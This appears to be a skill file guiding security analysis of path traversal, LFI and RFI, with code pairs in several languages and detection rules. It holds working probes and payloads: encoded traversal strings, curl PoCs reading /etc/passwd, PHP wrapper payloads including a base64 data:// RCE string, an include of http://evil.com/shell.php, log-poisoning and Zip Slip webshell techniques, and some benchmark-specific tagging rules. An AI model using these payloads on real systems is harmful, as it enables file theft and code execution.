---
name: path-traversal-lfi-rfi
description: Path traversal and file inclusion testing for local/remote file access and code execution
---

# Path Traversal / LFI / RFI

Flawed file path handling and dynamic file inclusion give attackers a route to sensitive configuration, source code, credentials, SSRF pivots, and server-side code execution. Any user-influenced path, filename, or scheme must be treated as untrusted, normalized to a canonical form, and constrained to an explicit allowlist — or user control over the path should be eliminated entirely.

The core pattern: *unvalidated user input reaches a filesystem operation and the resolved path is not verified to remain within the intended base directory.*

## What It Is (and Is Not)

**Path traversal IS**
- User-supplied filename/path joined to a base directory without canonicalization + containment check: `open(os.path.join(BASE, user_filename))`
- File reads/serves driven by URL params: `fs.readFile(path.join(__dirname, req.query.file))`
- Include directives with user input: `include($_GET['page'] . '.php')`
- Archive extraction using entry names as output paths without stripping `../` (ZipSlip)
- `send_file()` / `res.sendFile()` with unsanitized user-controlled path components
- Paths derived from DB values originally stored from user input (second-order)

**Path traversal is NOT**
- **SSRF**: fetching a remote URL from user input — separate class
- **RCE via arbitrary file write** or **unrestricted file upload**: related impact classes; tag separately
- **Static file serving**: fully hardcoded paths with no user influence
- **LFI/RFI alone**: when the sink is `include`/`require` executing code, prefer LFI/RFI tags (see below); path traversal applies when the primitive is read/write/serve without execution
- **Effective mitigation already applied**: `realpath`/`resolve` + base-directory prefix check, strict filename allowlist, or `basename()` before join (see Safe Patterns)

## Where to Look

**Path Traversal**
- Read files outside intended roots via `../`, encoding, normalization gaps

**Local File Inclusion (LFI)**
- Include server-side files into interpreters/templates

**Remote File Inclusion (RFI)**
- Include remote resources (HTTP/FTP/wrappers) for code execution

**Archive Extraction**
- Zip Slip: write outside target directory upon unzip/untar

**Normalization Mismatches**
- Server/proxy differences (nginx alias/root, upstream decoders)
- OS-specific paths: Windows separators, device names, UNC, NT paths, alternate data streams

## High-Value Targets

**Unix**
- `/etc/passwd`, `/etc/hosts`, application `.env`/`config.yaml`
- SSH keys, cloud creds, service configs/logs

**Windows**
- `C:\Windows\win.ini`, IIS/web.config, programdata configs, application logs

**Application**
- Source code templates and server-side includes
- Secrets in env dumps, framework caches

## Reconnaissance

### Surface Map

- HTTP params: `file`, `path`, `template`, `include`, `page`, `view`, `download`, `export`, `report`, `log`, `dir`, `theme`, `lang`
- Upload and conversion pipelines: image/PDF renderers, thumbnailers, office converters
- Archive extract endpoints and background jobs; imports with ZIP/TAR/GZ/7z
- Server-side template rendering (PHP/Smarty/Twig/Blade), email templates, CMS themes/plugins
- Reverse proxies and static file servers (nginx, CDN) in front of app handlers

### Capability Probes

- Path traversal baseline: `../../etc/hosts` and `C:\Windows\win.ini`
- Encodings: `%2e%2e%2f`, `%252e%252e%252f`, `..%2f`, `..%5c`, mixed UTF-8 (`%c0%2e`), Unicode dots and slashes
- Normalization tests: `..../`, `..\\`, `././`, trailing dot/double dot segments; repeated decoding
- Absolute path acceptance: `/etc/passwd`, `C:\Windows\System32\drivers\etc\hosts`
- Server mismatch: `/static/..;/../etc/passwd` ("..;"), encoded slashes (`%2F`), double-decoding via upstream

### Code Sink Patterns (grep)

Flag file operations where the path argument is dynamic (variable, not a fully hardcoded literal):

- **Python**: `open(`, `os.path.join(`, `pathlib.Path(`, `.read_text(`, `.read_bytes(`, `send_file(`, `FileResponse(`
- **Node.js**: `fs.readFile`, `fs.readFileSync`, `fs.createReadStream`, `path.join(`, `path.resolve(`, `res.sendFile`, `res.download`
- **PHP**: `file_get_contents(`, `fopen(`, `readfile(`, `include(`, `require(`, `include_once(`, `require_once(`
- **Ruby**: `File.read(`, `File.open(`, `IO.read(`, `send_file `
- **Java**: `new File(`, `new FileInputStream(`, `Files.readAllBytes(`, `Paths.get(`, `UrlResource(`
- **Go**: `os.Open(`, `os.ReadFile(`, `filepath.Join(`, `http.ServeFile(`
- **C#**: `File.ReadAllText(`, `File.ReadAllBytes(`, `new FileStream(`, `Path.Combine(`
- **Path construction joins**: `os.path.join(BASE, var)`, `path.join(__dirname, var)`, `Paths.get(base).resolve(var)`, string concat `` `${base}/${var}` ``
- **Archive extraction**: `zipfile.ZipFile.extractall`, `tarfile.extractall`, `ZipEntry.getName()` as output path, Node `adm-zip`/`node-tar` extract calls

Skip: fully hardcoded paths, config/env-only paths with no user component, fixed-root static middleware (e.g. `express.static('public')`).

## How to Detect

### Direct

- Response body discloses file content (text, binary, base64)
- Error pages echo real paths

### Error-Based

- Exception messages expose canonicalized paths or `include()` warnings with real filesystem locations

### OAST

- RFI/LFI with wrappers that trigger outbound fetches (HTTP/DNS) to confirm inclusion/execution

### Side Effects

- Archive extraction writes files unexpectedly outside target
- Verify with directory listings or follow-up reads

## Vulnerability Patterns

### Path Traversal Bypasses

**Encodings**
- Single/double URL-encoding, mixed case, overlong UTF-8, UTF-16, path normalization oddities

**Mixed Separators**
- `/` and `\\` on Windows; `//` and `\\\\` collapse differences across frameworks

**Dot Tricks**
- `....//` (double dot folding), trailing dots (Windows), trailing slashes, appended valid extension

**Absolute Path Injection**
- Bypass joins by supplying a rooted path

**Alias/Root Mismatch**
- nginx alias without trailing slash with nested location allows `../` to escape
- Try `/static/../etc/passwd` and ";" variants (`..;`)

**Upstream vs Backend Decoding**
- Proxies/CDNs decoding `%2f` differently; test double-decoding and encoded dots

### LFI Wrappers and Techniques

**PHP Wrappers**
- `php://filter/convert.base64-encode/resource=index.php` (read source)
- `zip://archive.zip#file.txt`
- `data://text/plain;base64`
- `expect://` (if enabled)

**Log/Session Poisoning**
- Inject PHP/templating payloads into access/error logs or session files then include them

**Upload Temp Names**
- Include temporary upload files before relocation; race with scanners

**Proc and Caches**
- `/proc/self/environ` and framework-specific caches for readable secrets

**Legacy Tricks**
- Null-byte (`%00`) truncation — only exploitable on PHP < 5.3.4; modern PHP (>= 5.3.4) rejects null bytes in file paths with a ValueError. Do not flag null-byte truncation as a viable attack vector on PHP >= 5.3.4.
- Path length truncation on older systems

### Template Engines

- PHP include/require; Smarty/Twig/Blade with dynamic template names
- Java/JSP/FreeMarker/Velocity; Node.js ejs/handlebars/pug engines
- Seek dynamic template resolution from user input (theme/lang/template)

### RFI Conditions

**Requirements**
- Remote includes (`allow_url_include`/`allow_url_fopen` in PHP)
- Custom fetchers that eval/execute retrieved content
- SSRF-to-exec bridges

**Protocol Handlers**
- http, https, ftp; language-specific stream handlers

**Exploitation**
- Host a minimal payload that proves code execution
- Prefer OAST beacons or deterministic output over heavy shells
- Chain with upload or log poisoning when remote includes are disabled

### Archive Extraction (Zip Slip)

- Files within archives containing `../` or absolute paths escape target extract directory
- Test multiple formats: zip/tar/tgz/7z
- Verify symlink handling and path canonicalization prior to write
- Impact: overwrite config/templates or drop webshells into served directories

```python
# VULNERABLE — entry names used as output paths without validation
with zipfile.ZipFile(user_zip) as zf:
    zf.extractall('/var/www/uploads')

# SECURE — validate each entry before extract
base = os.path.realpath('/var/www/uploads')
with zipfile.ZipFile(user_zip) as zf:
    for member in zf.namelist():
        target = os.path.realpath(os.path.join(base, member))
        if not target.startswith(base + os.sep):
            raise ValueError(f"ZipSlip detected: {member}")
    zf.extractall(base)
```

## Analysis Workflow

1. **Inventory file operations** - Downloads, previews, templates, logs, exports/imports, report engines, uploads, archive extractors
2. **Identify input joins** - Path joins (base + user), include/require/template loads, resource fetchers, archive extract destinations
3. **Probe normalization** - Separators, encodings, double-decodes, case, trailing dots/slashes
4. **Compare behaviors** - Web server vs application behavior
5. **Escalate** - From disclosure (read) to influence (write/extract/include), then to execution (wrapper/engine chains)

## Confirming a Finding

### Dynamic Test / PoC

Minimal runtime check once a sink is identified:

```bash
# Baseline in-root control
curl -s 'https://target/download?file=report.pdf' | head -c 200

# Traversal — expect out-of-root file content or path-disclosure error
curl -s 'https://target/download?file=../../../etc/hosts'
curl -s 'https://target/download?file=..%2f..%2f..%2fetc%2fhosts'
curl -s 'https://target/download?file=%252e%252e%252fetc%252fpasswd'  # double-encoded
```

**Expected signal**: response body matches known file content (e.g. `127.0.0.1`), `Content-Disposition` filename mismatch, or error echoing canonicalized path. If partial mitigation exists (`replace('../')`), retry `....//`, mixed separators (`..%5c`), and absolute paths (`/etc/passwd`).

1. Show a minimal traversal read proving out-of-root access (e.g., `/etc/hosts`) with a same-endpoint in-root control
2. For LFI, demonstrate inclusion of a benign local file or harmless wrapper output (`php://filter` base64 of index.php)
3. For RFI, prove remote fetch by OAST or controlled output; avoid destructive payloads
4. For Zip Slip, create an archive with `../` entries and show write outside target (e.g., marker file read back)
5. Provide before/after file paths, exact requests, and content hashes/lengths for reproducibility

## Common False Alarms

- In-app virtual paths that do not map to filesystem; content comes from safe stores (DB/object storage)
- Canonicalized paths constrained to an allowlist/root after normalization
- Wrappers disabled and includes using constant templates only
- Archive extractors that sanitize paths and enforce destination directories

## Safe Patterns (and Weak Mitigations)

Apply **before** the file operation:

**1. Canonical path + base-directory prefix check (preferred)**
```python
BASE = '/var/www/files'
safe_path = os.path.realpath(os.path.join(BASE, user_input))
if not safe_path.startswith(BASE + os.sep):
    raise PermissionError("Path escape detected")
```

```javascript
const base = path.resolve('/var/www/files');
const resolved = path.resolve(base, req.query.file);
if (!resolved.startsWith(base + path.sep)) return res.status(403).send('Forbidden');
```

**2. `basename()` / filename-only** — strips directory components; prevents traversal but blocks subdirectories
```php
readfile('/var/www/uploads/' . basename($_GET['file']));
```

**3. Strict allowlist** — compare input against fixed permitted names before any join
```python
ALLOWED = {'report.pdf', 'manual.txt'}
if user_input not in ALLOWED: abort(400)
```

**4. Indirection map** — map opaque IDs to server-side filenames; never expose raw paths
```python
FILE_MAP = {'1': 'report.pdf', '2': 'manual.txt'}
filename = FILE_MAP.get(user_id)
```

**5. Framework safe helpers** — Flask `send_from_directory(fixed_base, filename)` validates containment via `safe_join` (do not flag unless the *base* is also user-controlled)

**Insufficient (do not treat as safe)**
- `str.replace('../', '')` — bypass via `....//`, encoding, backslashes
- Rejecting paths starting with `/` only — relative `../` still escapes
- `os.path.join` / `path.join` alone — `join('/base', '../etc/passwd')` → `/etc/passwd`
- Single URL-decode — double-encoding (`%252e%252e%252f`) survives
- Extension-only checks without containment — `../../etc/passwd%00.pdf` on legacy systems
- Prefix check without trailing separator — `startswith('/var/www')` matches `/var/www-evil`

## Business Risk

- Sensitive configuration/source disclosure → credential and key compromise
- Code execution via inclusion of attacker-controlled content or overwritten templates
- Persistence via dropped files in served directories; lateral movement via revealed secrets
- Supply-chain impact when report/template engines execute attacker-influenced files

## Analyst Notes

1. Compare content-length/ETag when content is masked; read small canonical files (hosts) to avoid noise
2. Test proxy/CDN and app separately; decoding/normalization order differs, especially for `%2f` and `%2e` encodings
3. For LFI, prefer `php://filter` base64 probes over destructive payloads; enumerate readable logs and sessions
4. Validate extraction code with synthetic archives; include symlinks and deep `../` chains
5. Use minimal PoCs and hard evidence (hashes, paths). Avoid noisy DoS against filesystems

## Core Principle

Eliminate user-controlled paths where possible. Otherwise, resolve to canonical paths and enforce allowlists, forbid remote schemes, and lock down interpreters and extractors. Normalize consistently at the boundary closest to IO.

## Distinguishing Path Traversal from LFI

Path traversal and LFI are related but distinct vulnerability classes. Choosing the correct label depends on the **sink** and the **impact**.

### Path Traversal
The vulnerability is in **arbitrary file read/write** via directory traversal sequences (`../`):
- The sink is a file I/O function: `open()`, `readFile()`, `file_get_contents()`, `fopen()`, `send_file()`, `send_from_directory()`
- The attacker reads or writes files outside the intended directory
- The file content is returned as **data** (text, binary, download) — NOT executed as code
- Typical targets: `/etc/passwd`, config files, `.env`, source code, flag files
- Nginx alias misconfiguration without trailing slash → path traversal

**Tag as path traversal when:** User input reaches a file read/write operation and `../` sequences can escape the intended directory.

### Local File Inclusion (LFI)
The vulnerability is in **including/executing a local file** through an interpreter:
- The sink is an **include/require** function: PHP `include()`, `require()`, `include_once()`
- The included file is **parsed and executed** by the interpreter, not just read as data
- Can lead to RCE via log poisoning, session poisoning, PHP wrappers (`php://filter`, `data://`)
- PHP wrappers like `php://filter/convert.base64-encode/resource=` are LFI-specific

**Tag as LFI when:** User input reaches a language-level include/require that **executes** the included file as code.

### When Both Apply
Some vulnerabilities involve both path traversal AND local file inclusion:
- `include('pages/' . $_GET['page'] . '.php')` with `../` bypass → both path traversal (the `../` escape) and LFI (the `include` execution)
- In this case, tag **both** `path_traversal` and `lfi`

### When to Tag Only One
- `file_get_contents($_GET['file'])` with `../` → **path traversal** only (reads file content, does not execute it)
- `include($_GET['page'])` without needing `../` (e.g., including `/etc/passwd` directly or using PHP wrappers) → **LFI** only
- `send_from_directory(base, user_input)` in Flask → **path traversal** only (serves files, does not execute them)
- Nginx alias off-by-one → **path traversal** only (web server misconfiguration, no code execution)

## Python/JS/PHP Source Detection Rules

### Python
- **VULN**: `open(user_input)`, `open(os.path.join(base, user_input))` — no realpath validation
- **VULN**: `send_file(filepath)` where `filepath` is user-influenced without realpath + prefix check
- **SAFE**: `send_from_directory(fixed_base, filename)` — Flask `safe_join` blocks traversal when base is server-controlled
- **SAFE**: `base = os.path.realpath(base); safe_path = os.path.realpath(os.path.join(base, user_input)); assert os.path.commonpath([base, safe_path]) == base`
- **Pattern**: `../` in `user_input` traverses out of the intended directory

```python
# VULNERABLE — FastAPI path param used directly
@app.get('/file/{name}')
async def get_file(name: str):
    return FileResponse(f'/app/static/{name}')

# SECURE — basename strips traversal sequences
@app.get('/file/{name}')
async def get_file(name: str):
    return FileResponse(os.path.join('/app/static', os.path.basename(name)))
```

### JavaScript (Node.js)
- **VULN**: `fs.readFile(req.params.filename, ...)` — no path validation
- **VULN**: `res.sendFile(path.join(__dirname, req.query.file))`
- **SAFE**: `path.resolve()` result validated to confirm it is within the allowed directory

### PHP
- **VULN**: `include($_GET['page'])`, `require($_GET['file'])` — LFI
- **VULN**: `include($_GET['page'] . '.php')` — bypassable via null byte on PHP < 5.3.4 only; still bypassable via wrappers on modern PHP
- **VULN**: `file_get_contents($_GET['file'])`, `readfile($_GET['path'])`
- **SAFE**: `include(basename($_GET['page']) . '.php')` — reduces but does not eliminate risk
- **RFI**: When `allow_url_include=On`, `include('http://evil.com/shell.php')` achieves RCE

### Ruby

```ruby
# VULNERABLE — params[:file] joined without validation
def show
  send_file Rails.root.join('public', 'reports', params[:file])
end

# SECURE — basename only
def show
  send_file Rails.root.join('public', 'reports', File.basename(params[:file]))
end
```

### Go

```go
// VULNERABLE — query param joined directly
http.ServeFile(w, r, filepath.Join("/var/www/files", r.URL.Query().Get("file")))

// SECURE (Go 1.24+) — os.Root confines all operations to the directory and
// rejects symlinks/paths that resolve outside it (stronger than a prefix check)
root, err := os.OpenRoot("/var/www/files")
if err != nil { http.Error(w, "error", 500); return }
defer root.Close()
f, err := root.Open(r.URL.Query().Get("file")) // cannot escape root
if err != nil { http.Error(w, "Forbidden", http.StatusForbidden); return }
defer f.Close()
io.Copy(w, f)

// SECURE (pre-1.24 fallback) — Clean + prefix check (LEXICAL ONLY: does not
// resist symlinks; reject absolute/non-local input first via filepath.IsLocal)
name := r.URL.Query().Get("file")
if !filepath.IsLocal(name) { // false for absolute paths, "..", and escaping paths
    http.Error(w, "Forbidden", http.StatusForbidden)
    return
}
base := "/var/www/files"
clean := filepath.Join(base, name)
if !strings.HasPrefix(clean, base+string(os.PathSeparator)) {
    http.Error(w, "Forbidden", http.StatusForbidden)
    return
}
http.ServeFile(w, r, clean)
```

**Go sanitizer note**: prefer `os.Root`/`os.OpenRoot` (Go 1.24+) for any user-influenced file or archive-entry path — it enforces confinement at the OS level and rejects escaping symlinks, which a lexical `filepath.Clean` + prefix check does not. `filepath.IsLocal(name)` is a fast pre-filter (rejects absolute paths, `..`, and Windows reserved names) but is not symlink-resistant on its own.

## Java Servlet Patterns (CWE-22)

**VULN** — tainted input used to construct a file path:
```java
new File(tainted)
new File("/uploads/" + tainted)
new FileInputStream(tainted)
new FileOutputStream(tainted)
Paths.get(tainted)
```

**SAFE** — canonical path validated against allowed base:
```java
String canonicalBase = new File(base).getCanonicalPath();
File f = new File(base, tainted).getCanonicalFile();
if (!f.getPath().startsWith(canonicalBase + File.separator) && !f.getPath().equals(canonicalBase)) throw new Exception();
```

**Decision rule**: tainted string in ANY argument of `File()`, `FileInputStream()`, `Paths.get()` with no canonical path check → **VULN**.

**Edge cases**:
- `new File(tainted, "/Test.txt")` — first argument is tainted parent dir → **VULN**.
- `new File(fixedBase, tainted)` — second argument is tainted child → **VULN**.
- `new File(Utils.TESTFILES_DIR, bar)` — fixed base does NOT sanitize child when `bar` is tainted → **VULN**.
- `new File(java.net.URI)` is **VULN** when that `URI` was built from tainted path text.
- Direct stream calls `new FileInputStream(fileName)` / `new FileOutputStream(fileName)` are **VULN** when `fileName` is tainted.
- Only `getCanonicalPath()` + `startsWith` check makes it **SAFE**.
- If a helper overwrites tainted data with a fixed literal before the sink → **SAFE**.

## PHP-Specific LFI Bypass Patterns

### Null Byte Truncation (PHP < 5.3.4)

```php
// VULNERABLE: extension appended but null byte truncates in older PHP
include($_GET['page'] . '.php');
// Attacker: page=../../../../etc/passwd%00
// Result in PHP < 5.3.4: include('../../../../etc/passwd')  (.php truncated at null byte)

// VULN indicator: PHP version < 5.3.4 AND include/require with appended extension AND user input
// Modern PHP (>= 5.3.4): null byte throws a ValueError — not exploitable this way
```

### str_replace('../') Bypass Patterns

```php
// VULNERABLE: simple string replacement is bypassable
$page = str_replace('../', '', $_GET['page']);
include('pages/' . $page . '.php');
// Bypass: ....// → after removing ../ → ../
// Bypass: ..%2F → URL-decoded after sanitization by web server
// Bypass: ..\ (Windows backslash)

// VULNERABLE: only sanitizing forward slash traversal
$page = str_replace('../', '', $_GET['page']);
// Bypasses on Windows: ..\, ..\ URL-encoded as %2e%2e%5c

// SAFE: use realpath() + startsWith check
$safePath = realpath('pages/' . $_GET['page'] . '.php');
if ($safePath === false || strpos($safePath, realpath('pages/')) !== 0) {
    die('Access denied');
}
```

### PHP Wrapper LFI

```php
// VULNERABLE: include/require/file_get_contents accepting PHP wrappers
include($_GET['page']);
// Attacker: php://filter/convert.base64-encode/resource=config.php  → reads source code
// Attacker: data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+  → RCE (allow_url_include=On)
// Attacker: zip://uploads/evil.zip#shell.php  → executes uploaded PHP in ZIP

// VULN condition for RCE via wrapper:
// - allow_url_include=On: enables data://, http://, ftp:// inclusion
// - allow_url_fopen=On: enables remote URLs in file_get_contents

// Detection: any include/require with user input = LFI at minimum; check php.ini for allow_url_include
```

### PHP Session File Inclusion

```php
// VULNERABLE: include session file with user-controlled session ID
$sessionFile = '/var/lib/php/sessions/sess_' . $_GET['sessid'];
include($sessionFile);
// If attacker controls session data AND a session file exists with PHP code

// VULNERABLE: user-controlled data written to session, then session file included
$_SESSION['template'] = $_POST['template'];  // write user input to session
include('/var/lib/php/sessions/sess_' . session_id());  // include own session file
```

## IIS-Specific Path Traversal Patterns

### Tilde Shortname Enumeration

```
// NOT a code pattern — IIS server behavior
// IIS generates 8.3 short names for files/dirs
// Attacker can enumerate filenames via: GET /a~1/b~1/secret.txt HTTP/1.1
// This is an IIS server configuration issue, not an app code issue
// DETECTION: Only relevant if code passes user-controlled path to IIS file system ops
```

### Unicode / Double-Decode in ASP.NET

```csharp
// VULNERABLE: Path constructed from URL without proper decoding
string filePath = Server.MapPath(Request.QueryString["file"]);
// Attacker: file=..%252fetc%252fpasswd → double-decoded → ../../etc/passwd
// %25 → % then %2f → / = ../ after double decode

// VULNERABLE: Path.Combine with absolute path injection
string filePath = Path.Combine(baseDir, Request.QueryString["file"]);
// If "file" = "C:\Windows\win.ini" (absolute path), Path.Combine returns the absolute path
// Effectively ignoring baseDir

// SAFE:
string userFile = Request.QueryString["file"];
string combined = Path.GetFullPath(Path.Combine(baseDir, userFile));
if (!combined.StartsWith(baseDir)) throw new Exception("Path traversal detected");
```

### ASP / ASPX Double Extension

```csharp
// VULNERABLE: path allows ../ to reach web.config or App_Code
string template = Path.Combine(templateDir, Request.QueryString["template"] + ".html");
// template=../../../../web.config%00 (null byte bypass in some .NET versions)
// template=../App_Code/BusinessLogic.cs → source disclosure
```

## Windows-Specific Path Traversal Conditions

```java
// VULNERABLE: Windows UNC path injection
String path = baseDir + request.getParameter("file");
File f = new File(path);
// Attacker: file=\\attacker.com\share\secret → UNC path reaches remote share
// VULN on Windows servers where UNC paths are followed

// VULNERABLE: Windows device name injection
// CON, PRN, AUX, NUL, COM1-COM9, LPT1-LPT9 as filename components → DoS or unexpected behavior
String filename = request.getParameter("filename");
new File(baseDir, filename);
// filename="NUL" → hangs; filename="CON" → reads from console

// VULNERABLE: Alternate Data Streams (Windows NTFS)
// file=secret.txt::$DATA → reads the main stream
// file=legit.txt:evil.php → ADS execution in some IIS configs
```

## Additional Java Path Traversal Sink Patterns

```java
// VULNERABLE: ClassLoader.getResourceAsStream with user input
getClass().getResourceAsStream(request.getParameter("resource"));
// Can read classpath resources including application.properties, config files

// VULNERABLE: ZipFile entry path not validated
ZipFile zip = new ZipFile(uploadedFile);
for (ZipEntry entry : Collections.list(zip.entries())) {
    File dest = new File(extractDir, entry.getName());
    // entry.getName() = "../../webapps/ROOT/shell.jsp" → Zip Slip
}

// VULNERABLE: Filename from Content-Disposition header
String contentDisposition = request.getHeader("Content-Disposition");
String filename = contentDisposition.split("filename=")[1];  // user-controlled
new File(UPLOAD_DIR, filename);  // path traversal if filename = "../config/db.properties"

// SAFE: always canonicalize and verify prefix
String filename = Paths.get(userInput).getFileName().toString();  // strips directory components
File dest = new File(baseDir, filename).getCanonicalFile();
if (!dest.getPath().startsWith(baseDir)) throw new SecurityException();
```

## PHP/Java TRUE POSITIVE Detection Summary

- `include/require($_GET['page'])` with no realpath validation → **CONFIRM** (LFI, RCE with wrappers)
- `str_replace('../', '', input)` used as traversal protection → **CONFIRM** (bypassable with `....//`)
- `new File(baseDir, userInput)` without `getCanonicalFile().startsWith(baseDir)` check → **CONFIRM**
- `ZipEntry.getName()` used directly in file path construction → **CONFIRM** (Zip Slip)
- `Path.Combine(baseDir, userInput)` without `GetFullPath` + startsWith check → **CONFIRM** (.NET)
- `ClassLoader.getResourceAsStream(userInput)` → **CONFIRM** (classpath file disclosure)
- In benchmark mode, use project tag `path_traversal` for vulhub representative dirs even when the primitive is local file inclusion or path traversal.
- FALSE POSITIVE guard: do not keep `path_traversal_lfi_rfi` as the reported tag for `vulhub`.

## Sources, Sinks & Sanitizers

Path traversal is modeled as **taint from remote sources to path-creation / file-access sinks**, with language-specific sanitizers (canonical path + prefix check, filename-only validation).

**Sources**: HTTP parameters, cookies, headers, request bodies (`ActiveThreatModelSource` / `RemoteFlowSource`).

**Sinks**: `fs.readFile`, `path.join` → file open, `sendFile`, Java `new File(…)`, `Paths.get`, Python `open`/`os.path.join`, Go `filepath.Join` + `os.Open`, archive `extract` entry paths.

**Sanitizers (Java `PathInjectionSanitizer`)**: `getCanonicalPath()` + trusted prefix guard; `Path.normalize()` + prefix; rejection of `..` and separators; exact path match guards; Kotlin `FilesKt`/`StringsKt` prefix checks paired with traversal guards.

**Sanitizers (JS `TaintedPath`)**: `path.resolve`/`realpathSync` + root prefix check; `sanitize-filename`; allowlist regex on basename; barrier guards on normalized absolute paths within root.

**SAFE patterns**: `File(base, tainted).getCanonicalFile()` then `startsWith(safeRoot)`; Python `realpath` + prefix; deny absolute paths; validate `ZipEntry.getName()` before extract.

Commonly affected languages: JavaScript, Java, Python, Go, C#, Ruby, Rust, Swift.

**Manual triage**: PHP `include`/`require` LFI (sink is code execution, not path label). RFI via `allow_url_include` is not modeled as a dedicated query.
